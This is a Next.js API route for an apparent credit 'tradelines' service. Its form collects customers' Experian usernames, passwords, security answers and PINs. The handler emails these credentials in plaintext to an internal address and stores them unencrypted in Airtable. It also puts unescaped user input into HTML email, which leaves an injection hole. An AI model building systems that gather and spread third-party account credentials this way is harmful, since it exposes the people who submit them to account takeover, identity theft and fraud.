import { NextResponse } from "next/server";
import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

async function saveToAirtable(fields: Record<string, string>) {
  const token = process.env.AIRTABLE_TOKEN;
  const baseId = process.env.AIRTABLE_BASE_ID;
  if (!token || !baseId) {
    console.error("Missing Airtable env vars");
    return;
  }
  const res = await fetch(`https://api.airtable.com/v0/${baseId}/Credit%20Profile%20Reviews`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ fields }),
  });
  if (!res.ok) {
    const err = await res.text();
    console.error("Airtable write failed:", err);
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const {
      fullName,
      email,
      phone,
      referredBy,
      experianUsername,
      experianPassword,
      experianSecurityAnswer,
      experianPin,
    } = body;

    if (!fullName || !email || !phone || !experianUsername || !experianPassword || !experianSecurityAnswer || !experianPin) {
      return NextResponse.json({ error: "Incomplete form data" }, { status: 400 });
    }

    const row = (label: string, value: string, shaded = false) => `
      <tr style="${shaded ? "background:#FAF8F3;" : ""}">
        <td style="padding:10px 14px;font-weight:bold;border:1px solid #eee;width:160px;">${label}</td>
        <td style="padding:10px 14px;border:1px solid #eee;">${value}</td>
      </tr>`;

    const internalHtml = `
      <div style="font-family:sans-serif;max-width:600px;margin:0 auto;padding:40px 20px;">
        <div style="background:#1A1A1A;padding:24px 32px;border-radius:12px;margin-bottom:28px;">
          <h1 style="color:#C9A84C;margin:0;font-size:20px;letter-spacing:2px;text-transform:uppercase;">AOS Tradelines — Credit Profile Review</h1>
        </div>
        <h2 style="color:#1A1A1A;margin:0 0 20px;">${fullName} submitted a credit profile review request</h2>
        <table style="width:100%;border-collapse:collapse;font-size:14px;">
          ${row("Full Name", fullName, true)}
          ${row("Email", email)}
          ${row("Phone", phone, true)}
          ${row("Referred By", referredBy || "—")}
          ${row("Experian Username", experianUsername)}
          ${row("Experian Password", experianPassword, true)}
          ${row("Security Answer", experianSecurityAnswer)}
          ${row("4-Digit PIN", experianPin, true)}
        </table>
        <p style="margin-top:24px;font-size:12px;color:#999;">Submitted via AOS Tradelines credit profile form.</p>
      </div>
    `;

    const customerHtml = `
      <div style="font-family:sans-serif;max-width:600px;margin:0 auto;padding:40px 20px;background:#FAF8F3;">
        <div style="background:#1A1A1A;padding:32px;border-radius:16px;text-align:center;margin-bottom:32px;">
          <h1 style="color:#C9A84C;margin:0;font-size:24px;letter-spacing:2px;text-transform:uppercase;">AOS Tradelines</h1>
        </div>
        <div style="background:#FFFFFF;padding:32px;border-radius:16px;border:1px solid rgba(201,168,76,0.2);">
          <h2 style="color:#1A1A1A;margin:0 0 16px;font-size:20px;">Hi ${fullName},</h2>
          <p style="color:#4A4A4A;font-size:16px;line-height:1.6;margin:0 0 16px;">
            We've received your credit profile review request. Our team will review your information and reach out to you shortly.
          </p>
          <p style="color:#4A4A4A;font-size:14px;line-height:1.6;margin:0;">
            Questions? Email us at
            <a href="mailto:tradelines@aosimpactsolutions.com" style="color:#C9A84C;">tradelines@aosimpactsolutions.com</a>.
          </p>
        </div>
        <p style="color:#4A4A4A;opacity:0.4;font-size:12px;text-align:center;margin-top:24px;">
          © AOS Tradelines · All rights reserved
        </p>
      </div>
    `;

    // Run email + Airtable in parallel
    const [customerResult, internalResult, airtableResult] = await Promise.allSettled([
      resend.emails.send({
        from: "AOS Tradelines <noreply@aostradelines.com>",
        to: email,
        subject: `Credit Profile Review Received – ${fullName}`,
        html: customerHtml,
      }),
      resend.emails.send({
        from: "AOS Tradelines <noreply@aostradelines.com>",
        to: ["tradelines@aosimpactsolutions.com"],
        subject: `New Credit Profile Review – ${fullName}`,
        html: internalHtml,
      }),
      saveToAirtable({
        "Full Name": fullName,
        "Email": email,
        "Phone": phone,
        "Referred By": referredBy || "",
        "Experian Username": experianUsername,
        "Experian Password": experianPassword,
        "Security Answer": experianSecurityAnswer,
        "4-Digit PIN": experianPin,
        "Submitted At": new Date().toISOString(),
      }),
    ]);

    if (customerResult.status === "rejected") console.error("Customer email failed:", customerResult.reason);
    if (internalResult.status === "rejected") console.error("Internal email failed:", internalResult.reason);
    if (airtableResult.status === "rejected") console.error("Airtable save failed:", airtableResult.reason);

    return NextResponse.json({ success: true });
  } catch (err: any) {
    console.error("Credit profile error:", err);
    return NextResponse.json({ error: "Failed to process" }, { status: 500 });
  }
}
